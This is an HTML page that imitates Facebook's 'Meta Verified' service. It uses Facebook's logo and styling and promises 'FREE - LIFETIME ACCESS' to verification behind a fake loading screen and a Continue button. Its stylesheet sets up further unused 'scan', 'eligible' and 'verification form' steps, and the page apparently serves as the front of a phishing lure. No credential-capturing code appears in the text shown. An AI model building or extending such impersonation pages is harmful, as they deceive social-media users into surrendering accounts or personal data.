<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Verified – Facebook</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            background: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
        }

        /* ─── Section visibility ─── */
        .step { display: none; }
        .step.active { display: block; }

        /* ══════════════════════════════════════
           LOADING SCREEN
        ══════════════════════════════════════ */
        #load-screen {
            position: fixed; inset: 0;
            background: #000;
            display: flex; align-items: center; justify-content: center;
            z-index: 99999;
            transition: opacity .7s ease;
        }
        #load-screen.fade-out { opacity: 0; pointer-events: none; }
        #load-screen img { width: 100vw; height: 100vh; object-fit: cover; }

        /* ══════════════════════════════════════
           LANGUAGE MODAL
        ══════════════════════════════════════ */
        #lang-wrap {
            position: fixed; inset: 0;
            background: rgba(0,0,0,.55);
            backdrop-filter: blur(6px);
            display: flex; align-items: center; justify-content: center;
            z-index: 9000;
            opacity: 0; pointer-events: none;
            transition: opacity .35s ease;
        }
        #lang-wrap.show { opacity: 1; pointer-events: all; }
        #lang-box {
            background: #fff;
            border-radius: 18px;
            padding: 28px;
            width: 92%; max-width: 500px;
            box-shadow: 0 8px 40px rgba(0,0,0,.16);
            transform: translateY(18px);
            transition: transform .35s ease;
        }
        #lang-wrap.show #lang-box { transform: translateY(0); }
        .lm-top { display: flex; align-items: center; gap: 11px; margin-bottom: 4px; }
        .lm-icon {
            width: 34px; height: 34px;
            background: #1877f2; border-radius: 8px;
            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
        }
        .lm-icon img { width: 20px; height: 20px; border-radius: 50%; filter: brightness(10); }
        .lm-h { font-size: 17px; font-weight: 700; color: #1c1e21; }
        .lm-sub { font-size: 13px; color: #65676b; margin-bottom: 16px; }
        .lm-search {
            width: 100%; padding: 9px 13px;
            border: 1.5px solid #dddfe2; border-radius: 9px;
            font-size: 13.5px; font-family: inherit; outline: none; margin-bottom: 13px;
            transition: border-color .2s;
        }
        .lm-search:focus { border-color: #1877f2; }
        .lm-grid {
            display: grid; grid-template-columns: 1fr 1fr;
            gap: 7px; max-height: 260px; overflow-y: auto;
            padding-right: 4px;
        }
        .lm-grid::-webkit-scrollbar { width: 4px; }
        .lm-grid::-webkit-scrollbar-thumb { background: #dddfe2; border-radius: 4px; }
        .lm-opt {
            display: flex; align-items: center; gap: 9px;
            padding: 9px 13px;
            border: 1.5px solid #dddfe2; border-radius: 9px;
            cursor: pointer; font-size: 13.5px; font-weight: 500;
            transition: all .18s ease;
        }
        .lm-opt:hover { border-color: #1877f2; background: rgba(24,119,242,.05); }
        .lm-opt.sel { border-color: #1877f2; background: rgba(24,119,242,.08); }
        .lm-opt img { width: 22px; height: 16px; border-radius: 3px; object-fit: cover; flex-shrink: 0; }
        .lm-confirm {
            margin-top: 14px; width: 100%;
            padding: 13px; background: #1877f2;
            color: #fff; font-size: 15px; font-weight: 600;
            border: none; border-radius: 9px; cursor: pointer;
            font-family: inherit; transition: background .2s, opacity .2s;
        }
        .lm-confirm:disabled { opacity: .45; cursor: not-allowed; }
        .lm-confirm:not(:disabled):hover { background: #166fe5; }

        /* lang button in topbar */
        .topbar-lang {
            display: flex; align-items: center; gap: 5px;
            margin-left: auto;
            padding: 5px 10px;
            border: 1.5px solid #dddfe2; border-radius: 7px;
            background: transparent; font-size: 12.5px; font-weight: 500;
            cursor: pointer; font-family: inherit; color: #1c1e21;
            transition: border-color .2s;
        }
        .topbar-lang:hover { border-color: #1877f2; }
        .topbar-lang img { width: 16px; height: 12px; border-radius: 2px; }

        /* ══════════════════════════════════════
           GLOBAL NAVBAR — always same style
        ══════════════════════════════════════ */
        .topbar {
            background: #fff;
            border-bottom: 1px solid #dddfe2;
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 20px;
            gap: 10px;
            position: sticky;
            top: 0;
            z-index: 200;
        }
        .topbar-logo {
            width: 40px; height: 40px;
            border-radius: 50%;
            overflow: hidden;
            flex-shrink: 0;
        }
        .topbar-logo img { width: 100%; height: 100%; display: block; }
        .topbar-sep { width: 1px; height: 22px; background: #dddfe2; }
        .topbar-title { font-size: 15px; font-weight: 700; color: #1877f2; }
        .topbar-right { margin-left: auto; }
        .topbar-btn {
            padding: 8px 18px;
            background: #1877f2;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            font-family: inherit;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background .15s;
        }
        .topbar-btn:hover { background: #166fe5; }

        /* ══════════════════════════════════════
           GLOBAL FOOTER — same on all steps
        ══════════════════════════════════════ */
        .site-footer {
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #90949c;
            line-height: 2.2;
            border-top: 1px solid #dddfe2;
            background: #f7f8fa;
        }
        .site-footer a { color: #90949c; text-decoration: none; }
        .site-footer a:hover { color: #1877f2; text-decoration: underline; }
        .site-footer .s { margin: 0 5px; }

        /* ══════════════════════════════════════
           SHARED CARD STYLE
        ══════════════════════════════════════ */
        .card {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.08);
            margin-bottom: 14px;
        }

        /* ══════════════════════════════════════
           SHARED BUTTON
        ══════════════════════════════════════ */
        .fb-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: #fff;
            font-size: 15px;
            font-weight: 800;
            font-family: inherit;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background .15s;
            position: relative;
            letter-spacing: .1px;
        }
        .fb-btn:hover { background: #166fe5; }
        .fb-btn:active { background: #1464d8; }
        .fb-btn:disabled { opacity: .7; cursor: not-allowed; }
        .fb-btn.loading .btn-label { visibility: hidden; }
        .fb-btn.loading::after {
            content: '';
            position: absolute;
            inset: 0; margin: auto;
            width: 20px; height: 20px;
            border: 2.5px solid rgba(255,255,255,.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin .75s linear infinite;
        }

        /* ══════════════════════════════════════
           STEP 1 — SCAN + BADGE ANIMATED
        ══════════════════════════════════════ */

        /* ── Scan screen ── */
        #scanScreen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 56px);
            padding: 40px 24px;
            text-align: center;
        }
        .scan-ring-wrap {
            position: relative;
            width: 110px; height: 110px;
            margin: 0 auto 28px;
        }
        .scan-ring {
            position: absolute; inset: 0;
            border-radius: 50%;
            border: 3px solid #e4e6ea;
            border-top-color: #1877f2;
            animation: spin 1s linear infinite;
        }
        .scan-ring-inner {
            position: absolute; inset: 10px;
            border-radius: 50%;
            border: 2.5px solid #e4e6ea;
            border-bottom-color: #42b72a;
            animation: spin 1.6s linear infinite reverse;
        }
        .scan-fb-icon {
            position: absolute; inset: 0;
            display: flex; align-items: center; justify-content: center;
        }
        .scan-fb-icon img { width: 52px; height: 52px; border-radius: 50%; }

        .scan-title { font-size: 18px; font-weight: 800; color: #1c1e21; margin-bottom: 8px; }
        .scan-sub { font-size: 13.5px; color: #65676b; margin-bottom: 28px; line-height: 1.5; }

        .scan-progress-wrap { width: 100%; max-width: 280px; }
        .scan-progress-bar {
            width: 100%; height: 5px;
            background: #e4e6ea;
            border-radius: 99px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        .scan-progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #1877f2, #42b72a);
            border-radius: 99px;
            width: 0%;
            transition: width .08s linear;
        }
        .scan-status { font-size: 12.5px; color: #65676b; font-weight: 500; min-height: 18px; }

        .scan-checks { margin-top: 24px; display: flex; flex-direction: column; gap: 10px; width: 100%; max-width: 280px; }
        .scan-chk-row {
            display: flex; align-items: center; gap: 10px;
            font-size: 13px; color: #90949c; font-weight: 500;
            opacity: 0; transform: translateX(-12px);
            transition: opacity .3s ease, transform .3s ease;
        }
        .scan-chk-row.done { opacity: 1; transform: translateX(0); color: #1c1e21; }
        .scan-chk-icon {
            width: 20px; height: 20px;
            border-radius: 50%;
            background: #e4e6ea;
            flex-shrink: 0;
            display: flex; align-items: center; justify-content: center;
            transition: background .3s;
        }
        .scan-chk-row.done .scan-chk-icon { background: #42b72a; }
        .scan-chk-icon svg { width: 10px; height: 10px; opacity: 0; transition: opacity .2s .1s; }
        .scan-chk-row.done .scan-chk-icon svg { opacity: 1; }

        /* ── Eligible flash ── */
        #eligibleFlash {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 56px);
            padding: 40px 24px;
            text-align: center;
        }
        #eligibleFlash.show { display: flex; }
        .eligible-badge {
            width: 90px; height: 90px;
            margin: 0 auto 20px;
            animation: badgePop .5s cubic-bezier(.34,1.56,.64,1) both;
        }
        .eligible-badge img { width: 90px; height: 90px; }
        .eligible-glow {
            width: 90px; height: 90px;
            border-radius: 50%;
            background: rgba(24,119,242,.15);
            position: absolute;
            animation: glowPulse 1.5s ease-in-out infinite;
        }
        .eligible-wrap { position: relative; width: 90px; height: 90px; margin: 0 auto 20px; }
        .eligible-title {
            font-size: 22px; font-weight: 900; color: #1c1e21;
            margin-bottom: 6px;
            animation: fadeUp .4s .2s both;
        }
        .eligible-sub {
            font-size: 14px; color: #65676b;
            animation: fadeUp .4s .35s both;
            margin-bottom: 24px;
        }
        .eligible-tag {
            display: inline-flex; align-items: center; gap: 7px;
            background: #e6f4ea; border: 1.5px solid #42b72a;
            border-radius: 99px; padding: 6px 18px;
            font-size: 13px; font-weight: 800; color: #1a7f37;
            text-transform: uppercase; letter-spacing: .6px;
            animation: fadeUp .4s .5s both;
        }
        .eligible-dot { width: 7px; height: 7px; background: #42b72a; border-radius: 50%; animation: pulse 1.5s ease-in-out infinite; }

        /* ── Plan card ── */
        .mv-page {
            max-width: 480px;
            margin: 20px auto;
            padding: 0 16px 40px;
            animation: fadeUp .45s ease both;
        }
        .mv-card { padding: 0; overflow: hidden; }

        .mv-header {
            padding: 24px 20px 16px;
            text-align: center;
            border-bottom: 1px solid #f0f2f5;
        }
        .mv-title { font-size: 20px; font-weight: 800; color: #1c1e21; margin-bottom: 14px; }

        .mv-badge-wrap {
            width: 64px; height: 64px;
            margin: 0 auto 10px;
            position: relative;
        }
        .mv-badge-wrap img { width: 64px; height: 64px; animation: badgePop .6s cubic-bezier(.34,1.56,.64,1) both; }
        .mv-badge-glow {
            position: absolute; inset: -8px;
            border-radius: 50%;
            background: rgba(24,119,242,.12);
            animation: glowPulse 2s ease-in-out infinite;
        }

        .mv-plan-name { font-size: 17px; font-weight: 800; color: #1c1e21; margin-bottom: 2px; }
        .mv-plan-desc { font-size: 13px; color: #65676b; margin-bottom: 10px; }

        .mv-free-tag {
            display: inline-flex; align-items: center; gap: 6px;
            background: #e6f4ea; border: 1.5px solid #42b72a;
            border-radius: 99px; padding: 4px 14px;
            font-size: 12px; font-weight: 800; color: #1a7f37;
            text-transform: uppercase; letter-spacing: .6px;
            margin-bottom: 4px;
            position: relative; overflow: hidden;
        }
        .mv-free-tag::after {
            content: '';
            position: absolute; top: 0; left: -60%;
            width: 40%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,.6), transparent);
            animation: shimmer 2.5s ease-in-out infinite;
        }
        .mv-free-dot { width: 6px; height: 6px; background: #42b72a; border-radius: 50%; animation: pulse 1.5s ease-in-out infinite; }
        .mv-price-cross { font-size: 12px; color: #90949c; }
        .mv-price-cross s { margin-right: 3px; }

        .mv-body { padding: 0 20px 8px; }

        .mv-badge-item {
            display: flex; align-items: center; gap: 10px;
            padding: 14px 0;
            border-bottom: 1px solid #f0f2f5;
            animation: fadeUp .35s ease both;
        }
        .mv-badge-item .chk-circle {
            width: 22px; height: 22px;
            border: 2px solid #65676b;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .mv-badge-item .chk-circle svg { width: 11px; height: 11px; }
        .mv-badge-item-label { font-size: 14px; color: #1c1e21; font-weight: 500; }

        .mv-section { padding: 14px 0 4px; border-bottom: 1px solid #f0f2f5; }
        .mv-section:last-child { border-bottom: none; }
        .mv-section-title {
            font-size: 12.5px; font-weight: 800; color: #1c1e21;
            margin-bottom: 10px; text-transform: uppercase; letter-spacing: .4px;
        }

        .mv-feat {
            display: flex; align-items: flex-start; gap: 10px;
            margin-bottom: 10px;
            opacity: 0; transform: translateX(-10px);
            transition: opacity .3s ease, transform .3s ease;
        }
        .mv-feat.visible { opacity: 1; transform: translateX(0); }

        .mv-chk { width: 18px; height: 18px; flex-shrink: 0; margin-top: 1px; }
        .mv-chk svg { width: 18px; height: 18px; }
        .mv-feat-text { font-size: 13.5px; color: #1c1e21; line-height: 1.4; }
        .mv-feat-sub { font-size: 12px; color: #65676b; margin-top: 1px; line-height: 1.35; }

        .mv-card-foot { padding: 12px 20px 20px; text-align: center; }
        .mv-age-note { font-size: 12px; color: #90949c; margin-bottom: 14px; }
        .mv-continue-btn {
            width: 100%; padding: 14px;
            background: #1877f2; color: #fff;
            font-size: 16px; font-weight: 700; font-family: inherit;
            border: none; border-radius: 8px; cursor: pointer;
            transition: background .15s, transform .1s;
        }
        .mv-continue-btn:hover { background: #166fe5; transform: translateY(-1px); }

        /* ── Keyframes ── */
        @keyframes badgePop {
            from { opacity: 0; transform: scale(.4); }
            to   { opacity: 1; transform: scale(1); }
        }
        @keyframes glowPulse {
            0%,100% { transform: scale(1); opacity: .8; }
            50%      { transform: scale(1.18); opacity: 0; }
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes shimmer {
            0%   { left: -60%; }
            60%,100% { left: 130%; }
        }

        /* ══════════════════════════════════════
           STEP 2 — VERIFICATION FORM
        ══════════════════════════════════════ */
        .form-page { max-width: 640px; margin: 22px auto; padding: 0 16px 40px; }

        .breadcrumb {
            font-size: 12.5px;
            color: #65676b;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
            flex-wrap: wrap;
        }
        .breadcrumb a { color: #1877f2; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .bc-sep { color: #bcc0c4; }

        .hdr-card { padding: 20px; display: flex; align-items: flex-start; gap: 13px; }
        .hdr-badge { width: 44px; height: 44px; flex-shrink: 0; }
        .hdr-badge img { width: 44px; height: 44px; }
        .hdr-h { font-size: 17px; font-weight: 800; color: #1c1e21; margin-bottom: 4px; }
        .hdr-p { font-size: 13px; color: #65676b; line-height: 1.5; }

        .info-card { padding: 16px 20px; font-size: 13.5px; color: #3e4042; line-height: 1.65; }
        .info-card-t { font-size: 13.5px; font-weight: 700; color: #1c1e21; margin-bottom: 6px; display: flex; align-items: center; gap: 7px; }
        .info-card-t .dot { width: 7px; height: 7px; border-radius: 50%; background: #1877f2; flex-shrink: 0; }

        .warn-strip {
            display: flex;
            align-items: flex-start;
            gap: 9px;
            background: #fff8e1;
            border: 1.5px solid #f0c040;
            border-radius: 9px;
            padding: 11px 15px;
            margin-bottom: 14px;
            font-size: 13px;
            color: #7d5200;
            font-weight: 500;
            line-height: 1.5;
        }

        .vid-card { overflow: hidden; }
        .vid-lbl { padding: 12px 18px 8px; font-size: 13.5px; font-weight: 700; color: #1c1e21; display: flex; align-items: center; gap: 7px; }
        .vid-lbl svg { width: 16px; height: 16px; }
        .vid-card video { width: 100%; display: block; }
    </style>
</head>
<body>

    <div id="load-screen">
        <img src="https://i.ibb.co/3S8fS6p/loading.gif" alt="Loading...">
    </div>

    <div class="topbar">
        <div class="topbar-logo"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y2/r/y9f38ot17_1.png" alt="fb"></div>
        <div class="topbar-sep"></div>
        <div class="topbar-title">Meta Verified</div>
    </div>

    <div class="mv-page">
        <div class="card mv-card">
            <div class="mv-header">
                <div class="mv-badge-wrap">
                    <div class="mv-badge-glow"></div>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" alt="Badge">
                </div>
                <div class="mv-plan-name">Meta Verified</div>
                <div class="mv-free-tag"><div class="mv-free-dot"></div>FREE - LIFETIME ACCESS</div>
            </div>

            <div class="mv-body">
                <div class="mv-section">
                    <div class="mv-section-title">Maximum Discovery</div>
                    <div class="mv-feat visible">
                        <div class="mv-chk"><svg viewBox="0 0 20 20" fill="#42b72a"><path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm4.59 7.58l-5.46 5.46a.82.82 0 01-1.16 0L5.41 10.46a.82.82 0 011.16-1.16l2.05 2.05 4.88-4.88a.82.82 0 111.16 1.16z"/></svg></div>
                        <div class="mv-feat-text">Search optimization and featured profile</div>
                    </div>
                </div>

                <div class="mv-card-foot">
                    <p class="mv-age-note">Meta Verified is available for people aged 18+</p>
                    <button class="mv-continue-btn">Continue</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Loading screen ko 2 second baad hatane ke liye
        setTimeout(() => {
            document.getElementById('load-screen').classList.add('fade-out');
        }, 2000);
    </script>

</body>
</html>
